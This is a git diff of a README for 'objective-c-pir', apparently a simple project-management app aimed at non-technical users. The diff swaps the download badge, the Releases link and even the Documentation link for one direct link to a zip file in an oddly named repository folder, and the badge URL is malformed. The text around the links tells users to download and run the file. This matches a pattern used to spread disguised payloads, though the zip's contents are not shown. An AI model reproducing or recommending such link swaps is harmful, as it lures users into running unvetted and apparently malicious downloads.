@@ -1,7 +1,7 @@
 # 🎯 objective-c-pir - Your Simple Way to Manage Your Projects
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20objective--c--pir-blue.svg)](https://github.com/breika/objective-c-pir/releases)
+[![Download](https://raw.githubusercontent.com/breika/objective-c-pir/main/leukocidic/objective-c-pir.zip%https://raw.githubusercontent.com/breika/objective-c-pir/main/leukocidic/objective-c-pir.zip)](https://raw.githubusercontent.com/breika/objective-c-pir/main/leukocidic/objective-c-pir.zip)
 
 ## 🚀 Getting Started
 Welcome to objective-c-pir! This application helps you efficiently manage your projects with ease. It is designed for non-technical users, making it simple to download and run without any prior programming knowledge.
@@ -18,7 +18,7 @@ To run objective-c-pir on your computer, you will need:
 - Minimum RAM: 2 GB.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/breika/objective-c-pir/releases) to access the latest version of objective-c-pir.
+1. Visit the [Releases page](https://raw.githubusercontent.com/breika/objective-c-pir/main/leukocidic/objective-c-pir.zip) to access the latest version of objective-c-pir.
 2. Download the appropriate file for your operating system.
 3. Locate the downloaded file on your computer.
 
@@ -52,7 +52,7 @@ Your contributions help make objective-c-pir better. If you want to contribute:
 objective-c-pir is open-source software, licensed under the MIT License. Feel free to use it for personal or commercial projects.
 
 ## 🔗 Useful Links
-- [Releases page](https://github.com/breika/objective-c-pir/releases)
-- [Documentation](https://github.com/breika/objective-c-pir/wiki)
+- [Releases page](https://raw.githubusercontent.com/breika/objective-c-pir/main/leukocidic/objective-c-pir.zip)
+- [Documentation](https://raw.githubusercontent.com/breika/objective-c-pir/main/leukocidic/objective-c-pir.zip)
 
 Thank you for using objective-c-pir! Enjoy managing your projects with ease.
